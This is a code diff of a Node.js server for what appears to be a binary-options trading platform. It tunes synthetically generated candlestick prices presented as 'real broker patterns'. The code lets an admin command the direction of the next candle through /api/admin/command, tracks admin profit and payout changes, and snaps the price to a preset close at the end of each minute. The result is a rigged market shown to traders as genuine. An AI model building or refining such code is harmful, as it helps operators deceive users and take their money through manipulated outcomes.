@@ -1,4 +1,4 @@
-// --- START: main app server.js (v30.3 - Quotex Style Candles & Exact 60s Sync) ---
+// --- START: main app server.js (v30.4 - Real Market Accurate Candle Proportions) ---
 
 const express = require('express');
 const http = require('http');
@@ -33,7 +33,7 @@ const wss = new WebSocket.Server({ server });
 
 // --- SYSTEM CONSTANTS ---
 const TIMEFRAME = 60000; 
-const TICK_MS = 250; // Faster tick for smoother movement
+const TICK_MS = 300; // Standard tick
 const MIN_PRICE = 0.00001;
 const HISTORY_SEED_COUNT = 100;
 const MAX_CANDLES = 5000;
@@ -84,48 +84,48 @@ db.ref('admin/markets').on('value', (snapshot) => {
     });
 });
 
-// 1. Natural Market Generation (QUOTEX STYLE: Small bodies, long wicks, choppy)
+// 1. Natural Market Generation (100% REAL BROKER PATTERNS)
 function generateHistoricalCandle(timestamp, open, isLive = false) {
     const safeOpen = Math.max(MIN_PRICE, open);
     const isGreen = Math.random() > 0.5;
     
-    // Very low base volatility to keep bodies small like Quotex
-    const baseVol = safeOpen * 0.000045; 
+    // Normal base volatility
+    const baseVol = safeOpen * 0.00008; 
     
-    let body, upperWick, lowerWick;
+    let bodySize, upperWick, lowerWick;
     const rand = Math.random();
 
-    if (rand < 0.45) {
-        // 45% Chance: Doji / Spinning Top (Very small body, visible wicks)
-        body = baseVol * (Math.random() * 0.3); 
-        upperWick = baseVol * (0.8 + Math.random() * 2);
-        lowerWick = baseVol * (0.8 + Math.random() * 2);
+    if (rand < 0.10) {
+        // 10% Chance: Doji / Spinning Top (Small body, noticeable wicks)
+        bodySize = baseVol * (Math.random() * 0.2); 
+        upperWick = baseVol * (0.5 + Math.random() * 1.5);
+        lowerWick = baseVol * (0.5 + Math.random() * 1.5);
     } 
-    else if (rand < 0.75) {
-        // 30% Chance: Hammer / Shooting Star (Small body, one long wick)
-        body = baseVol * (0.4 + Math.random() * 0.8);
+    else if (rand < 0.25) {
+        // 15% Chance: Hammer / Shooting Star (Small/Medium body, one long wick)
+        bodySize = baseVol * (0.3 + Math.random() * 0.6);
         if (Math.random() > 0.5) {
-            upperWick = baseVol * (2 + Math.random() * 2.5);
-            lowerWick = baseVol * (Math.random() * 0.4);
+            upperWick = baseVol * (1.5 + Math.random() * 2.5);
+            lowerWick = baseVol * (Math.random() * 0.3);
         } else {
-            upperWick = baseVol * (Math.random() * 0.4);
-            lowerWick = baseVol * (2 + Math.random() * 2.5);
+            upperWick = baseVol * (Math.random() * 0.3);
+            lowerWick = baseVol * (1.5 + Math.random() * 2.5);
         }
     } 
-    else if (rand < 0.96) {
-        // 21% Chance: Normal OTC Candle (Medium small body, standard wicks)
-        body = baseVol * (1.0 + Math.random() * 1.5);
-        upperWick = baseVol * (0.3 + Math.random() * 1.2);
-        lowerWick = baseVol * (0.3 + Math.random() * 1.2);
+    else if (rand < 0.40) {
+        // 15% Chance: Marubozu / Strong trend (Large body, tiny wicks)
+        bodySize = baseVol * (1.5 + Math.random() * 1.5);
+        upperWick = baseVol * (Math.random() * 0.2);
+        lowerWick = baseVol * (Math.random() * 0.2);
     } 
     else {
-        // 4% Chance: Slightly larger body (But not insanely huge)
-        body = baseVol * (2.5 + Math.random() * 1.5);
-        upperWick = baseVol * (Math.random() * 0.3);
-        lowerWick = baseVol * (Math.random() * 0.3);
+        // 60% Chance: Normal Everyday Candle (Good body, standard wicks)
+        bodySize = baseVol * (0.6 + Math.random() * 1.0);
+        upperWick = baseVol * (0.2 + Math.random() * 0.8);
+        lowerWick = baseVol * (0.2 + Math.random() * 0.8);
     }
 
-    const close = isGreen ? safeOpen + body : safeOpen - body;
+    const close = isGreen ? safeOpen + bodySize : safeOpen - bodySize;
     const finalHigh = Math.max(safeOpen, close) + upperWick;
     const finalLow = Math.min(safeOpen, close) - lowerWick;
 
@@ -142,23 +142,23 @@ function generateHistoricalCandle(timestamp, open, isLive = false) {
 // 2. Exact Pattern Generator
 function generateDynamicCandle(timestamp, open, command, lastCandle, cloneData) {
     let bodySize, upperWick, lowerWick, close, high, low;
-    const volatility = open * 0.00005; // Reduced to match Quotex style
+    const volatility = open * 0.00008;
 
     switch (command) {
         case 'GREEN': 
-            bodySize = volatility * 1.5; close = open + bodySize; upperWick = volatility * 0.8; lowerWick = volatility * 0.8; break;
+            bodySize = volatility * 1.5; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
         case 'RED': 
-            bodySize = volatility * 1.5; close = open - bodySize; upperWick = volatility * 0.8; lowerWick = volatility * 0.8; break;
+            bodySize = volatility * 1.5; close = open - bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
         case 'BULLISH_MARUBOZU': 
-            bodySize = volatility * 3.5; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
+            bodySize = volatility * 3; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
         case 'BEARISH_MARUBOZU': 
-            bodySize = volatility * 3.5; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
+            bodySize = volatility * 3; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
         case 'DOJI': 
             bodySize = open * 0.000001; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
         case 'GREEN_HAMMER': 
-            bodySize = volatility * 0.5; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
+            bodySize = volatility * 0.4; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
         case 'RED_HAMMER': 
-            bodySize = volatility * 0.5; close = open - bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
+            bodySize = volatility * 0.4; close = open - bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
         default: 
             bodySize = volatility; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5;
     }
@@ -243,7 +243,7 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
 
                 newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection, lastCandle);
                 newCandle.isAdminCommand = false; 
-                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00002); // Small variance
+                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00003); 
                 
                 let payoutChange = 0;
                 let adminProfitChange = 0;
@@ -280,20 +280,18 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
 
     if (!candle.waypoints) {
         candle.waypoints = [];
-        const numWaypoints = 15; // More waypoints = more choppy/realistic movement
+        const numWaypoints = 10;
         for (let i = 0; i < numWaypoints; i++) {
             if (i === 0) candle.waypoints.push(candle.open);
-            else if (i === numWaypoints - 1) candle.waypoints.push(candle.targetClose);
+            else if (i === numWaypoints - 1 || i === numWaypoints - 2) candle.waypoints.push(candle.targetClose);
             else {
                 let wp = candle.targetLow + Math.random() * (candle.targetHigh - candle.targetLow);
-                // Bias slightly towards center so wicks are left behind
                 wp = (wp + candle.open + candle.targetClose) / 3; 
                 candle.waypoints.push(wp);
             }
         }
-        // Force high/low extremes somewhere in the middle
-        candle.waypoints[3] = candle.targetHigh;
-        candle.waypoints[10] = candle.targetLow;
+        candle.waypoints[2] = candle.targetHigh;
+        candle.waypoints[6] = candle.targetLow;
     }
 
     const numWaypoints = candle.waypoints.length;
@@ -305,12 +303,12 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
     const endWp = candle.waypoints[currentWaypointIndex + 1];
     
     let idealPrice = startWp + (endWp - startWp) * smoothStep;
-    const volatility = candle.open * 0.000015; // Micro volatility for ticks
+    const volatility = candle.open * 0.000015; 
     const noise = (Math.random() - 0.5) * volatility;
 
     marketData.currentPrice = idealPrice + noise;
     
-    // 🔥 58 SEC BUG FIX: Only lock the price exactly 200ms before close (was 1500ms before)
+    // 🔥 EXACT 60s CLOSE: Only jump to target close right at the end
     if (timeElapsed >= TIMEFRAME - 200) {
         marketData.currentPrice = candle.targetClose;
     } else {
@@ -324,7 +322,6 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
 }
 
 function broadcastCandle(marketId, candle) {
-    // Send exact server time to keep clients in strict 60s sync
     const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
     wss.clients.forEach((client) => {
         if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
@@ -364,7 +361,6 @@ app.post('/api/admin/command', (req, res) => {
     if (markets[marketId]) {
         markets[marketId].nextCandleCommand = command;
         if (cloneData) markets[marketId].nextCandleCloneData = cloneData;
-        console.log(`[API] Admin commanded Next Candle for ${marketId} to be ${command}`);
         res.json({ success: true, message: `Command ${command} received` });
     } else {
         res.status(404).json({ error: 'Market not found on server' });
@@ -375,7 +371,6 @@ app.post('/api/admin/command', (req, res) => {
 let lastSyncTime = 0;
 setInterval(() => {
     const now = Date.now();
-    // Using strict 60000ms grid
     const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
 
     for (const marketId in markets) {
@@ -399,7 +394,6 @@ setInterval(() => {
         if (Object.keys(batchUpdates).length > 0) db.ref().update(batchUpdates).catch(()=>{});
     }
 }, TICK_MS);
-
 
 // ==========================================
 // 🔥 TELEGRAM 2FA BOT SYSTEM 🔥 (Unchanged)
@@ -661,6 +655,6 @@ setInterval(async () => {
     }
 }, 2000);
 
-app.get('/ping', (_req, res) => res.send('Server V30.3 - Quotex Style Candles Active'));
+app.get('/ping', (_req, res) => res.send('Server V30.4 - Realistic Body & Wick Ratio Active'));
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`Server running on ${PORT}`));
